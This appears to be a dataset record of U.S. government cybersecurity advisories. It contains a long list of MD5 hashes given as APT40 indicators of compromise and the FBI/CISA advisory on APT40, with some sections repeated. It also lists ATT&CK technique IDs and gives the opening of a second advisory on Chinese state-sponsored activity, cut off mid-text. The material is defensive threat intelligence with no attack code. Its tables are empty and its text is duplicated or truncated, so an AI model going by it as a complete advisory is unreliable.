0b7bb3e23a1be2f26b9adf7004fc6b52
0b9a614a2bbc64c1f32b95988e5a3359
0bbe092a2120b1be699387be16b5f8fb
0bbe769505ca3db6016da400539f77aa
0c3c00c01f4c4bad92b5ba56bd5a9598
0c4fa4dfbe0b07d3425fea3efe60be1c
0ca936a564508a1f9c91cb7943e07c30
0d69eefede612493afd16a7541415b95
0da08b4bfe84eacc9a1d9642046c3b3c
0dd7f10fdf60fc36d81558e0c4930984
0e01ec14c25f9732cc47cf6344107672
10191b6ce29b4e2bddb9e57d99e6c471
105757d1499f3790e69fb1a41e372fd9
207e3c538231eb0fd805c1fc137a7b46
20e52d2d1742f3a3caafbac07a8aa99a
226042db47bdd3677bd16609d18930bd
22823fed979903f8dfe3b5d28537eb47
2366918da9a484735ec3a9808296aab8
239a22c0431620dc937bc36476e5e245
2499390148fc99a0f38148655d8059e7
24dbcd8e8e478a35943a05c7adfc87cc
25a06ab7675e8f9e231368d328d95344
25b79ba11f4a22c962fea4a13856da7f
25fc4713290000cdf01d3e7a0cea7cef
2639805ae43e60c8f04955f0fe18391c
270df5aab66c4088f8c9de29ef1524b9
280e5a3b9671db31cf003935c34f8cf9
28366de82d9c4441f82b84246369ad3b
28628f709a23d5c02c91d6445e961645
28c6f235946fd694d2634c7a2f24c1ba
29c1b4ec0bc4e224af2d82c443cce415
2b8a06d1de446db3bbbd712cdb2a70ce
2bf998d954a88b12dbec1ee96b072cb9
2c408385acdb04f0679167223d70192b
2c9737c6922b6ca67bf12729dcf038f9
2dd9aab33fcdd039d3a860f2c399d1b1
2de0e31fda6bc801c86645b37ee6f955
2e5b59c62e6e2f3b180db9453968d817
2ee7168c0cc6e0df13d0f658626474bb
2eee367a6273ce89381d85babeae1576
2f0a52ce4f445c6e656ecebbcaceade5
2f9995bc34452c789005841bc1d8da09
30701b1d1e28107f8bd8a15fcc723110
31a72e3bf5b1d33368202614ffd075db
3389dae361af79b04c9c8e7057f60cc6
33d18e29b4ecc0f14c20c46448523fc8
46e80d49764a4e0807e67101d4c60720
480f3a13998069821e51cda3934cc978
48101bbdd897877cc62b8704a293a436
48548309036005b16544e5f3788561dc
4a23e0f2c6f926a41b28d574cbc6ac30
4ab825dc6dabf9b261ab1cf959bfc15d
4b18b1b56b468c7c782700dd02d621f4
4b93159610aaadbaaf7f60bea69f21a4
4beb3f7fd46d73f00c16b4cc6453dcdb
4dd6eab0fa77adb41b7bd265cfb32013
4e79e2cade96e41931f3f681cc49b60a
4ef1c48197092e0f3dea0e7a9030edc8
503f8dc2235f96242063b52440c5c229
50527c728506a95b657ec4097f819be6
5064dc5915a46bfa472b043be9d0f52f
513f559bf98e54236c1d4379e489b4bc
51e21a697aec4cc01e57264b8bfaf978
51f31ed78cec9dbe853d2805b219e6e7
52b0f7d77192fe6f08b03f0d4ea48e46
53ceeaf0a67239b3bc4b533731fd84af
56a9ff904b78644dee6ef5b27985f441
56b18ba219c8868a5a7b354d60429368
56d6d3aa1297c62c6b0f84e5339a6c22
57849bb3949b73e2cd309900adafc853
5826e0bd3cd907cb24c1c392b42152ca
5875dfe9a15dd558ef51f269dcc407b5
58e7fd4530a212b05481f004e82f7bc1
5957ef4b609ab309ea2f17f03eb78b2d
5984955cbc41b1172ae3a688ab0246c5
59ce71ffb298a5748c3115bc834335bf
5a8d488819f2072caed31ead6aeaf2fc
5acac898428f6d20f6f085d79d86db9c
5b2cddac9ebd7b0cd3f3d3ac15026ffb
6f6d12da9e5cf8b4a7f26e53cc8e9fbd
700d2582ccb35713b7d1272aa7cfc598
70206725df8da51f26d6362e21d8fadb
70e0052d1a2828c3da5ae3c90bc969ea
7204c1f6f1f4698ac99c6350f4611391
72a7fd2b3d1b829a9f01db312fdd1cd7
7327993142260cee445b846a12cf4e85
7525bc47e2828464ce07fa8a0db6844f
76adaa87f429111646a27c2e60bda61e
76c5dca8dc9b1241b8c9a376abab0cc5
782202b09f72b3cfdc93ffb096ca27de
7836c4a36cc66d4bcbd84abb25857d21
78a0af31a5c7e4aee0f9acde74547207
7969dc3c87a3d5e672b05ff2fe93f710
7a09bf329b0b311cc552405a38747445
7a63ea3f49a96fa0b53a84e59f005019
7b3f959ab775032a3ca317ebb52189c4
7b710f9731ad3d6e265ae67df2758d50
7bd10b5c8de94e195b7da7b64af1f229
7c036ba51a3818ddc8d51cf5a6673da4
7c49efe027e489134ec317d54de42def
7d63f39fb0100a51ba6d8553ef4f34de
7ef6802fc9652d880a1f3eaf944ce4a3
7f7d726ea2ed049ab3980e5e5cb278a3
7fe679c2450c5572a45772a96b15fcb1
83076104ae977d850d1e015704e5730a
8361b151c51a7ad032ad20cecf7316f4
838ceb02081ac27de43da56bec20fc76
84865f8f1a2255561175ab12d090da7c
8520062de440b75f65217ff2509120f7
85862c262c087dd4470bb3b055ef8ea5
85e5b11d79a7570c73d3aa96e5a4e84d
85ecef9ca15e25835a9300a85f9bcd2a
9d3fd2ff608e79101b09db9e361ea845
9d5206f692577d583b93f1c3378a7a90
9e592d0918c029aa49635f03947026e8
9f847b3618b31ef05aebd81332067bd8
9fdd77dc358843af3d7b3f796580c29d
a025881cd4ae65fab39081f897dc04fd
a0e3561633bdf674b294094ffa06a362
a13715be3d6cbd92ed830a654d086305
a2256f050d865c4335161f823b681c24
a26e600652c33dd054731b4693bf5b01
a2c66a75211e05b20b86dd90ba534792
a2cb95be941b94f5488eab6c2eec7805
a320510258668504ed0140e7b58ee31e
a34db95c0fcb78d9c5452f81254224eb
a3c0151e0b6289376f383630a8014722
a42a91354d605165d2c1283b6b330539
a4711b8414445d211826b4da3f39de0a
a4a70ce528f64521c3cd98dce841f6f3
a5ac89845910862cfef708b20acd0e44
a67fcb5dcfc9e3cfbfd7890e65d4f808
a68bf5fce22e7f1d6f999b7a580ae477
a6b9bbb87eb08168fc92271f69fa5825
a6cab9f2e928d71ed8ecf2c28f03a9a2
a7e4f42ad70ddd380281985302573491
a83b1aed22de71baee82e426842eeb48
a91dca76278cf4f4155eb1b0fc427727
a96dca187c3c001cad13440c3f7e77e8
aa73e7056443f1dd02480a22b48bdd46
aaafb1eeee552b0b676a5c6297cfc426
ab662cee6419327de86897029a619aeb
ab8f72562d02156273618d1f3746855c
abdb86d8b58b7394be841e0a4da9bec7
ace585625de8b3942cc3974cf476f8de
beea0da01409b73be94b8a3ef01c4503
befc121916f9df7363fead1c8554df9a
bf250a8c0c9a820cd1a21e3425acfe37
bfb0dcd9ef6ac6e016a8a5314d4ef637
bff56d7e963ea28176b0bcb60033635d
c05e5bc5adb803b8a53cff7f95621c73
c0ad63a680fbdc75d54b270cbedb4739
c0d9f3a67a8df0ed737ceb9e15bacc47
c112456341a1c5519e7039ce0ba960fa
c161f10fccecec67c589cdd24a05f880
c183e7319f07ccc591954068e15095db
c2e023b46024873573db658d7977e216
c380675a29f47dba0b1401c7f8e149dc
c3996bf709cad38d58907da523992e3b
c583ae5235ddea207ac11fff4af82d9b
c71f125fb385fed2561f3870b4593f18
c75a2b191da91114ceea80638bc54030
c78ee46ffbe5dd76d84fb6a74bf21474
c79b27fe1440b11a99a5611c9d6c6a78
c808d2ed8bb6b2e3c06c907a01b73d06
c8930a4fd33dcf18923d5cf0835272bd
c8940976a63366f39cfcdc099701093b
c89e8f0bc93d472a4f863a5fa7037286
c8a850a027fa4a3cdae7f87cc1c71ba0
cab21cb7ba1c45a926b96a38b0bdaaef
cbe63b9c0c9ac6e8c0f5b357df737c5e
cbfc1587f89f15a62f049e9e16cccf68
cd049c2b76c73510ae70610fd1042267
cd058dd28822c72360bc9950a6c56c45
cd427b4afea8032c77e907917608148a
cd81267e9c82d24a9f40739fa6bf1772
cdc22f7913eb93d77d629e59ac2dc46a
cdc585a1fd677da07163875cd0807402
e0b7e6c17339945bba43b8992a143485
e119a70f50132ae3afba3995fdf1aca6
e1512a0bf924c5a2b258ec24e593645a
e195d22652b01a98259818cfbab98d33
e1ab3358b5356adefaffbc15bc43a3f9
e1b840bbf5b54aeb19e6396cab8f4c6a
e26a29c0fc11cfb92936ab3374730b79
e284c25c50ba59d07a4fa947dc1a914a
e3867f6e964a29134c9ea2b63713f786
e3eb703ef415659f711b6bc5604e131e
e498718fd286aca7bb78858f4636f2db
e4d2c63a73a0f1c6b5e60bde81ac0289
e5478fb5e8d56334d19d43cae7f9224a
e5f7efcee5b15cf95a070a5cd05dbda9
e6348ee5beb9c581eeeaf4e076c5d631
e637f47c4f17c01a68539fcfcc4bc44f
e63fbc864b7911be296c8ee0798f6527
e68f9b39caf116fb108ccb5c9c4ce709
e6a757114c0940b6d63c6a5925ade27f
e6adc73df12092012f8cd246ba619f90
e8881037f684190d5f6cc26aab93d40f
e890fa6fd8a98fec7812d60f65bf1762
e8bc927ee0ae288609e1c37665a3314e
e8e73156316df88dee28214fb203658b
e957c36c9d69d6a8256b6ddf7f806f56
e9ce9b35e2386bf442e22a49243a647e
eadcae9ecba1097571c8d08e9b1c1a9c
eb06648b43d34f20fc1c40e509521e99
eb5e5db77540516e6400a7912ad0ef0d
eb5e999753f5ea094d59bdae0c66901c
eb5ee94048730b321e35394a0fb10a5d
eb64867dc48f757f0afe05dbf605b72d
eb88f415336f0dccedfc93405330c561
fae03ff044d6bb488e1a6f1c6428c510
fc2142bd72bd520338f776146903be67
fc9b8262905a80cc5381d520813d556d
fccd3de1df131f9d74949d69426c24af
fcd912fd7ed80e2cdf905873c6ced4ad
ff804e266a83974775814870cc49b66b


11166f8319c08c70fc886433a7dac92d
1223302912ec70c7c8350268a13ad226
139e071dd83304cdcfd5280022a0f958
13c93dc9186258d6c335b16dc7bb3c8c
14e2b0e47887c3bfbddb3b66012cb6e8
15437cfedfc067370915864feec47678
15e1816280d6c2932ff082329d0b1c76
166694d13ac463ea1c2bed64fbbb7207
16a344cd612cca4f0944ba688609e3ac
16c0011ea01c4690d5e76d7b10917537
1734a2b176a12eba8b74b8ca00ef1074
18144e860d353600bbd2e917aed21fde
1815c3a7a4a6d95f9298abb5855a3701
181a5b55b7987b62b5236965f473ba3b
18c26c5800e9e2482f1507c96804023e
1932ce50b7b6c88014cf082228486e5c
1af78c50aca90ee3d6c3497848ac5705
1b44fb4aaff71b1f96cd049a9461eaf5
1bb8f32e6e0e089d6a9c10737cf19683
1c35a87f61953baace605fff1a2d0921
1c945a6b0deccc6cd2f63c31f255d0ec
1cb216777039fe6a8464fc6a214c3c86
1d3a10846819a07eef66deefcc33459a
1dd6c80b4ea5d83aff4480dcbbef520c
1e91f0f52994617651e9b4a449af551a
1eb568559e335b3ed78588e5d99f9058
1ef9c42efe6e9a08b7ebb16913fa0228
1f2befede815fcf65c463bf875fcf497
1f9bdc0435ff0914605f01db8ca77a65
1ffd883095ff3279b31650ca3a50ad3c
34521c0f78d92a9d95e4f3ff15b516db
34681367cbcc3933f0f4b36481bde44e
34aa195c604d0725d7dd2aa4cc4efe28
354b95e858bcaced369ecbfdec327e2b
35f456afbe67951b3312f3b35d84ff0a
3647d11c155d414239943c8c23f6e8ec
37578c69c515f1d0d49769930fba25ce
375cbb0a88111d786c33510bff258a21
37b9b4ed979bd2cf818e2783499bfb5e
3810a18650dbacecd10d257312e92f61
3975740f65c2fa392247c60df70b1d6d
3a4ec0d0843769a937b5dadbe8ea56b1
3ab6bf23d5d244bc6d32d2626bd11c08
3bf8bb90d71d21233a80b0ec96321e90
3c2fe2dbdf09cfa869344fdb53307cb2
3c3d453ecf8cc7858795caece63e7299
3cbb46065f3e1dccbd707c340f38ce6b
3cf9dc0fdc2a6ab9b6f6265dc66b0157
3e89c56056e5525bf4d9e52b28fbbca7
3eb6f85ac046a96204096ab65bbd3e7e
3f50eedf4755b52aa7a7b740bd21daa6
3fefa55daeb167931975c22df3eca20a
4012acd80613aaa693a5d6cd4e7239ba
40528e368d323db0ac5c3f5e1efe4889
407c1ea99677615b80b2ffa2ed81d513
417949c717f78dc9e55ca81a5f7ade3e
4260e71d89f622c6a3359c5556b3aad7
429c10429a2ebb5f161e04159a59cf5b
4315975499cdc50098dbdb5b8aa4a199
44fa9c5df4ae20c50313aae02ba8fb95
4519b5d443a048a8599144900c4e1f28
45eb058edde4e5755a5ea1aff3ce3db7
460dc00ce690efacb5db8273c80e2b23
5b3050df93629f2f6cb3801ed19963c5
5b37ac4d642b96c4bf185c9584c0257a
5b3e945cd32a380f09ea98746f570758
5b72df8f6c110ae1d603354fcd8fe104
5c6f5cd81b099014718056e86b510fa2
5d63a3a02df2beda9d81f53abbd8264a
5d9c3cb239fa24bed2781bcf2898f153
5e353d1d17720c0f7c93f763e3565b3f
5f1c7f267fbe12210d3c80944f840332
5f393838220a6bf0cd9fd59c7cf97f5b
5f771966ef530ee0c2b42ef5cc46ad3a
6034ff91b376d653dc30f79664915b4e
603935efa89d93ea39b4b4d4a52ec529
607ea06890a6eedd723f629133576f20
60b2ce5ef4a076d1fa8675b584c27987
60cff7381b8fb64602816f9e5858930b
614909c72fa811ae41ea3d9b70122cee
6372d578e881abf76a4ec61e7a28da7d
63bf28f5dc6925a94c8b4e033a95be10
646cbeb4233948560ac50de555ea85ca
64db8e54d9a2daaa6d9cf156a8b73c18
675fe822243dfd1c3ace2a071d0aa6dd
67dbecfb5e0f2f729e57d0f1eda82c67
685cbba8cf2584a3378d82dec65aa0bb
693a4c2fcaa67fb87e62f150fb65e00e
6ad33ab8b9ff3f02964a8aab2a40ebb5
6b540be7ac7159104b0ffa536747f1bf
6b7276e4aa7a1e50735d2f6923b40de4
6b930be55ed4bf8e16b30eadc3873dfd
6c67f275d50f6bfee4848de6d4911931
6c9cfada134ede220b75087c7698ebf2
6e843ef4856336fe3ef4ed27a4c792b1
6e97bf1b7c44edc66622b43e81105779
86e50d6dc28283dbd295079252787577
870fbad5b9a54cb6720c122d1fa321ec
88b3b94574ba1eeb711a66eb04021eed
8956a045306b672d3cc852419a72c4b0
8a9ac1b3ef2bf63c2ddfadbbbfd456b5
8b3b96327fbddebefe727ac2edad5714
8baa499b3e2f081ff47f8cf06a5e7809
8bc20fcd09adb7ea86dda2c57477633b
8be0c21b6ee56d0f68e0d90f7d0a26d7
8c80dd97c37525927c1e549cb59bcbf3
8d2416d9f6926fb0dc12ab5dafef691d
8d74922b2b31354ce588cefac71d9a9b
8e8fb7632c3a7e96cf0ea5299d564018
8ee6c9e1adb71b2623d5e7aa45df5f4d
8efaa987959ef95179a0f5be05c10faf
8fbf53f77c98daba277dae7661b86f02
8fc825df73977eeffaaa1587565f7505
90a3e3a2049c6eb9e39d113d9451a83f
932d355d9f2df2e8d8449d85454fc983
9450980a4413dfdbc60a62b257a7b019
947892152b8419a2dfe498be5063c1da
94d42ff06a588587131c2cd8a9b2fe96
95c15b7961e2d6fad96defa7ff2c6272
96ba4bf00d8b4acee9f550286610dcc7
97004f1962e2aed917dc2be5c908278f
972077c1bb73ca78b7cad4ac6d56c669
991ebcd03ace627093acc860fae739b5
99949240bc4eae33cac4bbb93b72349d
9a0a8048d53dedc763992fff32584741
9a0e3e80cd7c21812de81224f646715e
9a61ed5721cf4586abd1d49e0da55350
9b26999182ea0c2b2cac91919697289e
9c656ce22c93ca31c81ff8378a0a91ee
ace620a0cc2684347e372f7e40e245d5
ad3b9e45192ec7c8085c3588cacb9c58
adb4f6ecb67732b7567486f0cee6e525
afa03ddb9fc64a795aadb6516c3bc268
b0269263ce024fc9de19f8f30bd51188
b04e895827c24070eb7082611ab79676
b059c9946ff67c62c074d6d15f356f6e
b07299a907a4732d14da32b417c08af3
b1dadfcf459f8447b9ec44d8767da36d
b2f1d2fefe9287f3261223b4b8219d03
b36f3e12cb88499f8795b8740ae67057
b4204f08c1a29fd4434e28b6219bfbc6
b4878c233d7f776a407f55a27b5effbc
b6c12d88eeb910784d75a5e4df954001
b7ab5c6926f738dbe8d3a05cb4a1b4f5
b80dcd50e27b85d9a44fc4f55ff0a728
b8a61b1fda80f95a7dcdb0137bc89f67
b9642c1b3dbcccc9d84371b3163d43e0
b9647f389978f588d977ef6ef863938f
b977bed98ae869a9bb9bf725215ef8e5
b9b627c470de997c01fdef4511029219
ba629216db6cf7c0c720054b0c9a13f3
badf0957c668d9f186fb218485d0d0f6
bb165b815e09fe95fa9282bce850528d
bbfb478770a911cf055b8dfd8dcb36e4
bc4c189e590053d2cf97569c495c9610
bc9089c39bcdb1c3ef2e5bd25c77ed68
bd42303e7c38486df2899b0ccf3ce8f7
bd452dc2f9490a44bcff8478d875af4b
bd6031dd85a578edf0bf1560caf36e02
bd63832e090819ea531d1a030fb04e9b
be39ff1ec88a1429939c411113b26c02
be88741844bf7c47f81271270abe82dc
ce26e91fc13ccb1be4b6bf6f55165410
ce449d7cb0a11b53b0513dde3bd57b1c
ceba742bccb23304cf05d6c565dc53f8
cebe44b8a9a2d6e15a03d40d9e98e0ed
cf946bc0faecb2dc8e8edc9e6ce2858f
d09fcd9fa9ed43c9f28bcd4bd4487d22
d0b5c11ee5df0d78bdde3fdc45eaf21d
d0d8243943053256bc1196e45fbf92d2
d0efc042ba4a6b207cf8f5b6760799d8
d20d01038e6ea10a9dcc72a88db5e048
d31596fe58ca278be1bb46e2a0203b34
d3df8c426572a85f3afa46e4cd2b66cd
d59a77a8da7bec1f4bad7054a41b3232
d76b1c624e9227131a2791957955dddc
d79477c9c688a8623930f4235c7228f6
d8a483d21504e73f0ba4b30bc01125d3
da46994fee26782605842005aabcd2fe
daa232882b74d60443dfec8742401808
dab45ac39e34cfee60dcb005c3d5a668
dbc583d6d5ec8f7f0c702b209af975e2
dbe92b105f474efc4a0540673da0eb9c
dbee8be5265a9879b61853cd9c0e4759
dc15ca49b39d1d17b22ec7580d32d905
dc386102060f7df285e9498f320f10e0
dd43cd0eddbb6f7cb69b1f469c37ec35
dd4e0f997e0b2cc9df28dca63ded6816
ddbdc6a3801906de598531b5b2dac02a
dde4ff4e41f86426051f15da48667f5f
ddecce92a712327c4068fabf0e1a7ff1
de608439f2bcc097b001d352b427bb68
deeb9b4789ac002aa8b834da76e70d74
df6475642f1fe122df3d7292217f1cff
e011784958e7a00ec99b8f2320e92bf4
ec4cdc752c2ecd0d9f97491cc646a269
edb648f6c3c2431b5b6788037c1cd8ef
ee3e297abd0a5b943dce46f33f3d56fb
ee4862bc4916fc22f219e1120bea734a
ef14448bf97f49a2322d4c79e64bb60b
ef2738889e9d041826d5c938a256bc45
ef6fcdd1b55adf8ad6bcdf3d93fd109e
efb5499492f08c1f10fecdeb703514d5
f0098aab593b65d980061a2df3a35c21
f073de9c169c8fcb2de5b811bff51cee
f0881d5a7f75389deba3eff3f4df09ac
f172ad4e906d97ed8f071896fc6789dc
f2b6bffa2c22420c0b1c848b673055ed
f446d8808a14649bddcc412f9e754890
f4dbe32f3505bc17364e2b125f8dd6df
f4dd628f6c0bc2472d29c796ee38bf46
f4e67343e13c37449ada7335b9c53dd1
f53e332b0a6dbe8d8d3177e93b70cb1e
f5ae03de0ad60f5b17b82f2cd68402fe
f5ce889a1fa751b8fd726994cdb8f97e
f5fdbfce1a5d2c000c266f4cd180a78d
f7202dea71cc638e0c2dbeb92c2ce279
f7cef381c4ee3704fc8216f00f87552a
f7ffbbbc68aadcbfbace55c58b6da0a7
f8b91554d221fe8ef4a4040e9516f919
f906571d719828f0f4b6212fc2aa7705
f9155052a43832061357c23de873ff9f
f9abacc459e5d50d8582e8c660752c4e
f9f608407d551f49d632bd6bd5bd7a56
f9fc9359dc5d1d0ac754b12efb795f79
fa27742b87747e64c8cb0d54aa70ef98
fa3c8d91ef4a8b245033ddb9aa3054a2
fad93907d5587eb9e0d8ebc78a5e19c2
			 
 
 
 
 




 

Contact Information

 
To report suspicious or criminal activity related to information found in this Joint Cybersecurity Advisory, contact your local FBI field office at www.fbi.gov/contact-us/field, or the FBI’s 24/7 Cyber Watch (CyWatch) at (855) 292-3937 or by email at CyWatch@fbi.gov. When available, please include the following information regarding the incident: date, time, and location of the incident; type of activity; number of people affected; type of equipment used for the activity; the name of the submitting company or organization; and a designated point of contact. To request incident response resources or technical assistance related to these threats, contact CISA at Central@cisa.dhs.gov.
 

References

DOJ Press Release
Talos Intelligence: China Chopper Still Active 9 Years Later
CISA China Cyber Threat Overview webpage 
CISA Alert TA15-314A: Compromised Web Servers and Web Shells - Threat Awareness and Guidance 
CISA Alert AA20-133A: Top 10 Routinely Exploited Vulnerabilities
CISA Alert AA20-275A: Potential for China Cyber Response to Heightened U.S.-China Tensions 
NSA Cybersecurity Advisory U/OO/179811-20: Chinese State-Sponsored Actors Exploit Publicly Known Vulnerabilities 

Revisions

July 19, 2021: Initial version|Updated July 19, 2021: Added note and STIX file






This product is provided subject to this Notification and this Privacy & Use policy.


","{'T1041', 'TA0003', 'TA0008', 'T1027.003', 'T1566.002', 'TA0010', 'T1203', 'TA0005', 'T1204.002', 'T1560', 'T1583', 'TA0006', 'T1190', 'T1074.001', 'T1572', 'TA0043', 'TA0011', 'T1204', 'TA1505', 'T1074.002', 'T1078', 'T1586.002', 'T1001.003', 'T1585.002', 'TA0001', 'T1566.001', 'T1133', 'TA0002', 'T1059.001', 'T1532', 'T1059', 'TA0009', 'T1189', 'T1583.001', 'TA0042', 'TA0004', 'T1534', 'T1078.001', 'T1589', 'TA0007', 'T1090.003', 'T1589.001'}","




Summary

This Joint Cybersecurity Advisory was written by the Federal Bureau of Investigation (FBI) and the Cybersecurity and Infrastructure Security Agency (CISA) to provide information on a Chinese Advanced Persistent Threat (APT) group known in open-source reporting as APT40. This advisory provides APT40’s tactics, techniques, and procedures (TTPs) and indicators of compromise (IOCs) to help cybersecurity practitioners identify and remediate APT40 intrusions and established footholds.
APT40—aka BRONZE MOHAWK, FEVERDREAM, G0065, Gadolinium, GreenCrash, Hellsing, Kryptonite Panda, Leviathan, MUDCARP, Periscope, Temp.Periscope, and Temp.Jumper—is located in Haikou, Hainan Province, People’s Republic of China (PRC), and has been active since at least 2009. APT40 has targeted governmental organizations, companies, and universities in a wide range of industries—including biomedical, robotics, and maritime research—across the United States, Canada, Europe, the Middle East, and the South China Sea area, as well as industries included in China’s Belt and Road Initiative.
On July 19, 2021, the U.S. Department of Justice (DOJ) unsealed an indictment against four APT40 cyber actors for their illicit computer network exploitation (CNE) activities via front company Hainan Xiandun Technology Development Company (Hainan Xiandun). Hainan Xiandun employee Wu Shurong cooperated with and carried out orders from PRC Ministry of State Security (MSS) Hainan State Security Department (HSSD) intelligence officers Ding Xiaoyang, Zhu Yunmin, and Cheng Qingmin to conduct CNE. Wu’s CNE activities resulted in the theft of trade secrets, intellectual property, and other high-value information from companies and organizations in the United States and abroad, as well as from multiple foreign governments. These MSS-affiliated actors targeted victims in the following industries: academia, aerospace/aviation, biomedical, defense industrial base, education, government, healthcare, manufacturing, maritime, research institutes, and transportation (rail and shipping).
Click here for a PDF version of this report.
(Updated July 19, 2021) 
Click here for indicators of compromise (IOCs) in STIX format. Note: to uncover malicious activity, incident responders search for IOCs in network- and host-based artifacts and assess the results—eliminating false positives during the assessment. For example, some MD5 IOCs in the STIX file identify legitimate tools—such as Putty, cmd.exe, svchost.exe, etc.—as indicators of compromise. Although the tools themselves are not malicious, APT40 attackers placed and used them from non-standard folders on victim systems during computer intrusion activity. If a legitimate tool is identified by an incident responder, then the location of the tool should be assessed to eliminate false positives or to uncover malicious activity. See Technical Approaches to Uncovering and Remediating Malicious Activity for more incident handling guidance.

Technical Details

This Joint Cybersecurity Advisory uses the MITRE ATT&CK® framework, version 9. See the ATT&CK for Enterprise framework for all referenced threat actor tactics and techniques.
APT40,G0065, has used a variety of tactics and techniques and a large library of custom and open-source malware—much of which is shared with multiple other suspected Chinese groups—to establish initial access via user and administrator credentials, enable lateral movement once inside the network, and locate high value assets in order to exfiltrate data. Table 1 provides details on these tactics and techniques. Note: see the appendix for a list of the domains, file names, and malware MD5 hash values used to facilitate this activity.
Table 1: APT40 ATT&CK Tactics and Techniques


Mitigations

Network Defense-in-Depth
Proper network defense-in-depth and adherence to information security best practices can assist in mitigating the threat and reducing the risk. The following guidance may assist organizations in developing network defense procedures.
Patch and Vulnerability Management

Install vendor-provided and verified patches on all systems for critical vulnerabilities, prioritizing timely patching of internet-connected servers and software processing internet data—such as web browsers, browser plugins, and document readers.
Ensure proper migrating steps or compensating controls are implemented for vulnerabilities that cannot be patched in a timely manner.
Maintain up-to-date antivirus signatures and engines.
Routinely audit configuration and patch management programs to ensure the ability to track and mitigate emerging threats. Implementing a rigorous configuration and patch management program will hamper sophisticated cyber threat actors’ operations and protect resources and information systems.
Review the articles in the References section for more information on Chinese APT exploitation of common vulnerabilities.

Protect Credentials

Strengthen credential requirements, regularly change passwords, and implement multi-factor authentication to protect individual accounts, particularly for webmail and VPN access and for accounts that access critical systems. Do not reuse passwords for multiple accounts. 
Audit all remote authentications from trusted networks or service providers.
Detect mismatches by correlating credentials used within internal networks with those employed on external-facing systems.
Log use of system administrator commands such as net, ipconfig, and ping.
Enforce principle of least privilege.

Network Hygiene and Monitoring

Actively scan and monitor internet-accessible applications for unauthorized access, modification, and anomalous activities. 
Actively monitor server disk use and audit for significant changes.
Log Domain Name Service (DNS) queries and consider blocking all outbound DNS requests that do not originate from approved DNS servers. Monitor DNS queries for C2 over DNS.
Develop and monitor the network and system baselines to allow for the identification of anomalous activity. Audit logs for suspicious behavior.
Identify and suspend access of users exhibiting unusual activity.
Use allowlist or baseline comparison to monitor Windows event logs and network traffic to detect when a user maps a privileged administrative share on a Windows system.
Leverage multi-sourced threat-reputation services for files, DNS, URLs, IP addresses, and email addresses.
Network device management interfaces—such as Telnet, Secure Shell (SSH), Winbox, and HTTP—should be turned off for wide area network (WAN) interfaces and secured with strong passwords and encryption when enabled.
When possible, segment critical information on air-gapped systems. Use strict access control measures for critical data. 

APPENDIX: APT40 Indicators of Compromise

APT40 used the following domains, file names, and malware MD5 hash values to facilitate the CNE activity outlined in this CSA between 2009 through 2018.
 
 
Domains


 

 
MD5 Malware Hashes
(Updated July 19, 2021) Note: to uncover malicious activity, incident responders search for indicators of compromise (IOCs) in network- and host-based artifacts and assess the results—eliminating false positives during the assessment. For example, some MD5 IOCs in the table below identify legitimate tools—such as PuTTY, cmd.exe, svchost.exe, etc.—as indicators of compromise. Although the tools themselves are not malicious, APT40 attackers placed and used them from non-standard folders on victim systems during computer intrusion activity. If a legitimate tool is identified by an incident responder, then the location of the tool should be assessed to eliminate false positives or to uncover malicious activity. See Technical Approaches to Uncovering and Remediating Malicious Activity for more incident handling guidance.
 


 

Contact Information

 
To report suspicious or criminal activity related to information found in this Joint Cybersecurity Advisory, contact your local FBI field office at www.fbi.gov/contact-us/field, or the FBI’s 24/7 Cyber Watch (CyWatch) at (855) 292-3937 or by email at CyWatch@fbi.gov. When available, please include the following information regarding the incident: date, time, and location of the incident; type of activity; number of people affected; type of equipment used for the activity; the name of the submitting company or organization; and a designated point of contact. To request incident response resources or technical assistance related to these threats, contact CISA at Central@cisa.dhs.gov.
 

References

DOJ Press Release
Talos Intelligence: China Chopper Still Active 9 Years Later
CISA China Cyber Threat Overview webpage 
CISA Alert TA15-314A: Compromised Web Servers and Web Shells - Threat Awareness and Guidance 
CISA Alert AA20-133A: Top 10 Routinely Exploited Vulnerabilities
CISA Alert AA20-275A: Potential for China Cyber Response to Heightened U.S.-China Tensions 
NSA Cybersecurity Advisory U/OO/179811-20: Chinese State-Sponsored Actors Exploit Publicly Known Vulnerabilities 

Revisions

July 19, 2021: Initial version|Updated July 19, 2021: Added note and STIX file






This product is provided subject to this Notification and this Privacy & Use policy.


",https://www.cisa.gov/news-events/cybersecurity-advisories/aa21-200a
63,"




Summary

This advisory uses the MITRE Adversarial Tactics, Techniques, and Common Knowledge (ATT&CK®) framework, Version 9, and MITRE D3FEND™ framework, version 0.9.2-BETA-3. See the ATT&CK for Enterprise for all referenced threat actor tactics and techniques and the D3FEND framework for referenced defensive tactics and techniques.
The National Security Agency, Cybersecurity and Infrastructure Security Agency (CISA), and Federal Bureau of Investigation (FBI) assess that People’s Republic of China state-sponsored malicious cyber activity is a major threat to U.S. and Allied cyberspace assets. Chinese state-sponsored cyber actors aggressively target U.S. and allied political, economic, military, educational, and critical infrastructure (CI) personnel and organizations to steal sensitive data, critical and emerging key technologies, intellectual property, and personally identifiable information (PII). Some target sectors include managed service providers, semiconductor companies, the Defense Industrial Base (DIB), universities, and medical institutions. These cyber operations support China’s long-term economic and military development objectives.
This Joint Cybersecurity Advisory (CSA) provides information on tactics, techniques, and procedures (TTPs) used by Chinese state-sponsored cyber actors. This advisory builds on previous NSA, CISA, and FBI reporting to inform federal, state, local, tribal, and territorial (SLTT) government, CI, DIB, and private industry organizations about notable trends and persistent TTPs through collaborative, proactive, and retrospective analysis.
To increase the defensive posture of their critical networks and reduce the risk of Chinese malicious cyber activity, NSA, CISA, and FBI urge government, CI, DIB, and private industry organizations to apply the recommendations listed in the Mitigations section of this advisory and in Appendix A: Chinese State-sponsored Cyber Actors' Observed Procedures. Note: NSA, CISA, and FBI encourage organization leaders to review CISA Joint Insights: Chinese Malicious Cyber Activity: Threat Overview for Leaders for information on this threat to their organization.
Click here for a PDF version of this report.

Technical Details

Trends in Chinese State-Sponsored Cyber Operations
NSA, CISA, and FBI have observed increasingly sophisticated Chinese state-sponsored cyber activity targeting U.S. political, economic, military, educational, and CI personnel and organizations. NSA, CISA, and FBI have identified the following trends in Chinese state-sponsored malicious cyber operations through proactive and retrospective analysis:


Acquisition of Infrastructure and Capabilities. Chinese state-sponsored cyber actors remain agile and cognizant of the information security community’s practices. These actors take effort to mask their activities by using a revolving series of virtual private servers (VPSs) and common open-source or commercial penetration tools.


